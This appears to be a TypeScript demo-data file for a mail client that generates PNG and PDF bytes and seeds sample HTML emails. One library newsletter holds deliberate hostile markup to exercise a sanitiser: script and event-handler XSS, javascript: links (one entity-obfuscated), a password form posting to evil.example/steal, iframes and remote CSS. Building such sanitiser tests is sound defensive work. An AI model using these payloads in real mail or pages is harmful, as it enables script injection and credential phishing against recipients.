/**
 * The demo world's HTML mail (slice 3): a newsletter with remote images, a tracker and everything a hostile mail
 * tries; a letter with a picture inside it (cid:), a quoted reply and files; and bytes for the lease's PDF. Remote
 * images in a demo come from `demoMailImages`, which draws them here: a demo hub never reaches the internet.
 */
import { deflateSync } from 'node:zlib';
import type { FakeInput, FakeMailBackend } from './fake.ts';

// ------------------------------------------------------------------ pictures and files made here

const CRC = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
function crc32(b: Uint8Array): number {
  let c = 0xffffffff;
  for (const x of b) c = CRC[(c ^ x) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

/** A PNG of `w`×`h`, a diagonal blend of two colours. */
export function demoPng(w: number, h: number, from: [number, number, number], to: [number, number, number]): Uint8Array {
  const raw = new Uint8Array((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (w * 3 + 1)] = 0;
    for (let x = 0; x < w; x++) {
      const k = (x / w + y / h) / 2;
      const o = y * (w * 3 + 1) + 1 + x * 3;
      for (let i = 0; i < 3; i++) raw[o + i] = Math.round(from[i] + (to[i] - from[i]) * k);
    }
  }
  const chunk = (type: string, data: Uint8Array) => {
    const out = new Uint8Array(12 + data.length);
    const v = new DataView(out.buffer);
    v.setUint32(0, data.length);
    out.set(new TextEncoder().encode(type), 4);
    out.set(data, 8);
    v.setUint32(8 + data.length, crc32(out.subarray(4, 8 + data.length)));
    return out;
  };
  const ihdr = new Uint8Array(13);
  const d = new DataView(ihdr.buffer);
  d.setUint32(0, w);
  d.setUint32(4, h);
  ihdr.set([8, 2, 0, 0, 0], 8);
  const parts = [new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(raw)), chunk('IEND', new Uint8Array())];
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let at = 0;
  for (const p of parts) out.set(p, (at += p.length) - p.length);
  return out;
}

/** A one-page PDF with these lines on it. */
export function demoPdf(lines: string[]): Uint8Array {
  const esc = (s: string) => s.replace(/[\\()]/g, (c) => '\\' + c);
  const text = `BT /F1 14 Tf 72 720 Td 18 TL ${lines.map((l) => `(${esc(l)}) Tj T*`).join(' ')} ET`;
  const objs = [
    '<< /Type /Catalog /Pages 2 0 R >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>',
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    `<< /Length ${text.length} >>\nstream\n${text}\nendstream`,
  ];
  let pdf = '%PDF-1.4\n';
  const offsets: number[] = [];
  objs.forEach((o, i) => {
    offsets.push(pdf.length);
    pdf += `${i + 1} 0 obj\n${o}\nendobj\n`;
  });
  const xref = pdf.length;
  pdf += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  pdf += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return new TextEncoder().encode(pdf);
}

/**
 * The image proxy's way out in a demo world: names under .example resolve to a documentation address, and what is
 * "fetched" there is drawn here. Anything else is not found, so a demo hub makes no request of its own.
 */
export const demoMailImages = {
  lookup: async (host: string) => (host.endsWith('.example') ? ['203.0.113.10'] : []),
  fetch: (async (_input: string | URL | Request, init?: RequestInit) => {
    const host = new Headers(init?.headers).get('host') ?? '';
    if (!host.endsWith('.example')) return new Response('not here', { status: 404 });
    const u = new URL(String(_input instanceof Request ? _input.url : _input));
    const seed = [...(host + u.pathname)].reduce((n, c) => (n * 31 + c.charCodeAt(0)) >>> 0, 7);
    const hue = (n: number) => [(seed >> n) & 0xff, (seed >> (n + 8)) & 0xff, 160] as [number, number, number];
    // A size the address asks for (`w`, `h`), else a banner's.
    const w = Math.min(1200, Number(u.searchParams.get('w')) || 600);
    const h = Math.min(1200, Number(u.searchParams.get('h')) || 180);
    return new Response(Buffer.from(demoPng(w, h, hue(0), hue(4))), { headers: { 'content-type': 'image/png' } });
  }) as typeof fetch,
};

// ------------------------------------------------------------------ the mail

const H = 3_600_000;

export function seedHtmlMail(fake: FakeMailBackend, account: string, me: { name: string; email: string }, now: number) {
  const put = (i: FakeInput) => fake.put(account, { flags: { seen: true }, ...i });
  const id = (k: string) => `<demo-${k}@dither.example>`;
  const library = { name: 'Maple Street Library', email: 'events@library.example' };
  const alice = { name: 'Alice Chen', email: 'alice.chen@example.org' };

  // A newsletter: a 600 px table, remote images and a tracker, and what a hostile mail tries.
  put({
    messageId: id('autumn'),
    from: [library],
    to: [me],
    subject: 'Autumn at the library: talks, workshops and a book sale',
    receivedAt: now - 2 * H,
    flags: { seen: false },
    bulk: { listId: '<events.library.example>', unsubscribe: '<https://library.example/leave>', precedence: 'bulk', autoSubmitted: null },
    text: 'Autumn at the library. Talks every Thursday, a book sale on the 14th.',
    html:
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/">' +
      '<link rel="stylesheet" href="https://evil.example/x.css"><style>@import url(https://evil.example/i.css); .hero{background:url(https://evil.example/bg.png)} td.c{padding:16px;font-family:Georgia,serif}</style>' +
      '<script>parent.document.title="hacked"</script></head><body bgcolor="#f3efe6" onload="parent.document.title=\'hacked\'">' +
      '<table width="600" cellpadding="0" cellspacing="0" align="center" style="width:600px;background:#fffdf8"><tr><td class="c">' +
      '<img src="https://images.library.example/autumn-banner.png" width="568" height="170" alt="Autumn at the library" class="hero">' +
      '<h1 style="color:#7a3b12">Autumn at the library</h1>' +
      '<p>Talks every Thursday at 7, a bookbinding workshop on Saturdays, and our <b>book sale</b> on the 14th.</p>' +
      '<p><a href="https://library.example/events">See every event</a> · <a href="https://library-events.example/rsvp">https://library.example/rsvp</a></p>' +
      '<p><a href="javascript:parent.document.title=\'hacked\'">Don\'t click</a> <a href="jav&#x61;script:alert(1)">this either</a></p>' +
      '<img src="x" onerror="parent.document.title=\'hacked\'" alt="">' +
      '<svg onload="parent.document.title=\'hacked\'"><script>parent.document.title="hacked"</script></svg>' +
      '<form action="https://evil.example/steal"><input name="password" placeholder="Your password"><button>Log in</button></form>' +
      '<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object>' +
      '<p style="color:#555;background-image:u\\72l(https://evil.example/css.png)">Opening hours: 9 to 8, Monday to Saturday.</p>' +
      '<p>Your member card, ready to scan at the desk:</p><img src="https://images.library.example/card.png?m=9xK2pL7qR4wZ8vB3" width="320" height="120" alt="Member card">' +
      '<img src="https://images.library.example/footer.png" width="568" height="80" alt="">' +
      '<img src="https://track.library.example/open.gif?u=zyan" width="1" height="1" alt="">' +
      '</td></tr></table></body></html>',
  });

  // A big store newsletter: style sheets, layout tables, dozens of pictures, a personal one and two open pixels.
  put({
    messageId: id('winter-sale'),
    from: [{ name: 'Northbound Outfitters', email: 'deals@store.example' }],
    to: [me],
    subject: 'The winter sale is on: up to 50% off',
    receivedAt: now - 3 * H,
    flags: { seen: false },
    bulk: { listId: '<deals.store.example>', unsubscribe: '<https://store.example/unsubscribe>', precedence: 'bulk', autoSubmitted: null },
    text: 'Northbound Outfitters. The winter sale is on: up to 50% off. Members save another 10% at checkout.',
    html: demoStoreNewsletter(),
  });

  // A letter with a picture inside it, a quote of what you wrote, and two files.
  const files: Record<string, Uint8Array | string> = {
    '2': demoPng(300, 180, [76, 140, 74], [214, 196, 120]),
    '3': 'Tomatoes: San Marzano, Black Krim\nBeans: Borlotti\nSquash: Delicata\nHerbs: basil, dill, parsley\n',
    '4': demoPdf(['The garden plan', '', 'North bed: tomatoes and basil', 'South bed: beans and squash', 'By the fence: herbs']),
  };
  const size = (k: string) => (typeof files[k] === 'string' ? new TextEncoder().encode(files[k] as string).length : (files[k] as Uint8Array).length);
  put({
    messageId: id('garden'),
    inReplyTo: id('garden-0'),
    references: [id('garden-0')],
    from: [alice],
    to: [me],
    subject: 'Re: The garden plan',
    receivedAt: now - 70 * 60_000,
    flags: { seen: false },
    text: 'Here is the sketch of the beds. The list of seeds is attached.\n\nAlice\n\nOn Sat, Zyan wrote:\n> Could you send the plan?',
    html:
      '<div dir="ltr"><p>Here is the sketch of the beds:</p><p><img src="cid:sketch@garden" alt="Sketch of the beds" width="300" height="180"></p>' +
      '<p>The list of seeds is attached, and the plan as a PDF.</p><p>Alice</p></div>' +
      '<div class="gmail_quote"><div class="gmail_attr">On Sat, Zyan &lt;zyan@dither.example&gt; wrote:</div>' +
      '<blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">Could you send the plan? I would like to see where the tomatoes go.</blockquote></div>',
    attachments: [
      { id: '2', filename: 'sketch.png', mime: 'image/png', size: size('2'), inline: true, contentId: '<sketch@garden>' },
      { id: '3', filename: 'seeds.txt', mime: 'text/plain', size: size('3'), inline: false, contentId: null },
      { id: '4', filename: 'garden-plan.pdf', mime: 'application/pdf', size: size('4'), inline: false, contentId: null },
    ],
    files,
  });
}

/**
 * A big store newsletter in the shape real ones have: a style sheet with classes and @media rules, nested layout
 * tables, dozens of product pictures (shared addresses), a personal header picture and two open pixels. Over 128 KB
 * once sanitised, so it is the one to forward when trying forwards.
 */
export function demoStoreNewsletter(): string {
  const css =
    '<style>body{margin:0;background:#eef2f5}.wrap{width:640px;margin:0 auto;background:#ffffff;font-family:Helvetica,Arial,sans-serif;color:#1c2b36}' +
    '.hdr{background:#0f4c5c;color:#ffffff;padding:18px 24px}.hdr h1{margin:0;font-size:26px;letter-spacing:.5px}.lead{padding:20px 24px;font-size:15px;line-height:1.5}' +
    '.grid td.cell{width:50%;padding:12px;vertical-align:top}.card{border:1px solid #d8e1e8;border-radius:8px;padding:10px;text-align:center}' +
    '.card .name{font-weight:bold;font-size:14px;margin:8px 0 2px}.card .price{color:#c2410c;font-size:16px;font-weight:bold}.card .was{color:#7b8a97;text-decoration:line-through;font-size:12px}' +
    '.btn{display:inline-block;background:#c2410c;color:#ffffff!important;text-decoration:none;padding:8px 14px;border-radius:6px;font-size:13px;margin-top:6px}' +
    '.foot{background:#f4f6f8;color:#5b6b78;font-size:11px;padding:16px 24px;line-height:1.6}.foot a{color:#5b6b78}' +
    '@media only screen and (max-width:600px){.wrap{width:100%!important}.grid td.cell{display:block;width:100%!important}.hdr h1{font-size:22px}}</style>';
  const names = ['Trail runner', 'Rain shell', 'Wool beanie', 'Camp mug', 'Head torch', 'Day pack', 'Merino tee', 'Gaiters', 'Water filter', 'Stove', 'Trekking poles', 'Down vest'];
  let rows = '';
  for (let i = 0; i < 34; i++) {
    const cell = (k: number) => {
      const n = names[k % names.length];
      const slug = n.toLowerCase().replace(/\s+/g, '-');
      return (
        `<td class="cell"><div class="card"><a href="https://store.example/p/${slug}-${k}"><img src="https://cdn.store.example/products/${slug}-${k}.png?w=260&h=200" width="260" height="200" alt="${n}"></a>` +
        `<div class="name">${n} ${k + 1}</div><div><span class="price">$${(19 + ((k * 7) % 80)).toFixed(2)}</span> <span class="was">$${(39 + ((k * 7) % 80)).toFixed(2)}</span></div>` +
        `<p style="font-size:12px;color:#5b6b78;margin:6px 0">Light, tough and ready for the next trip. Free returns for 60 days, and free shipping on orders over $50.</p>` +
        `<a class="btn" href="https://store.example/cart/add/${k}">Add to cart</a></div></td>`
      );
    };
    rows += `<tr>${cell(2 * i)}${cell(2 * i + 1)}</tr>`;
  }
  return (
    `<html><head>${css}</head><body><table class="wrap" width="640" cellpadding="0" cellspacing="0" align="center"><tr><td>` +
    '<div class="hdr"><h1>Northbound Outfitters</h1><div style="font-size:13px;opacity:.85">The winter sale is on: up to 50% off</div></div>' +
    '<img src="https://cdn.store.example/banners/winter-sale.png?w=640&h=240" width="640" height="240" alt="Winter sale" style="display:block;width:100%;height:auto">' +
    '<img src="https://img.store.example/hi/Zq81mXc2LpR7vN0kTb4W/welcome.png?w=640&h=60" width="640" height="60" alt="Hi there, member" style="display:block">' +
    '<div class="lead">Our biggest sale of the year starts today. Everything below is in stock and ships within a day. <b>Members save another 10%</b> at checkout.</div>' +
    `<table class="grid" width="100%" cellpadding="0" cellspacing="0">${rows}</table>` +
    '<div class="foot">You get this because you have an account with Northbound Outfitters. <a href="https://store.example/prefs">Email preferences</a> · <a href="https://store.example/unsubscribe">Unsubscribe</a><br>Northbound Outfitters, 12 Harbour Road, Portland</div>' +
    '<img src="https://u.store.example/o/Zq81mXc2LpR7vN0kTb4WmA9dFs3x" width="1" height="1" alt="">' +
    '<img src="https://shop.us1.list-manage.com/track/open.php?u=1d2c&id=9f8e" width="1" height="1" alt="" style="display:none">' +
    '</td></tr></table></body></html>'
  );
}

/** Bytes for files the slice 1 seed names (its lease PDF). */
export function demoFileBytes(): Record<string, Uint8Array | string> {
  return { 'att-lease': demoPdf(['Lease renewal', '', 'Signed by Alice Chen, page 2.', 'Please sign pages 3 and 4.']) };
}
